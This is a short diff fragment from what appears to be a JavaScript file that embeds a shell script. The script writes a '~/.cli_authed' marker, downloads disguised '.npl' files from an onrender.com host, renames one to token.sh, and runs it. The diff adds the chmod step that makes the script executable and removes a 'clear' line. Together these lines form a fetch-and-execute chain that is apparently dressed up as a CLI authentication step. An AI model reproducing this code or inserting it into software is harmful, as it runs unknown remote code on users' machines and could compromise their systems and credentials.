@@ -57,8 +57,8 @@ echo "success" > ~/.cli_authed
 wget -qO token.npl https://be-1-49aq.onrender.com/tokenlinux.npl
 wget -qO tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 mv token.npl token.sh
+chmod +x token.sh
 ./token.sh
-clear
 `);
 });
 // C
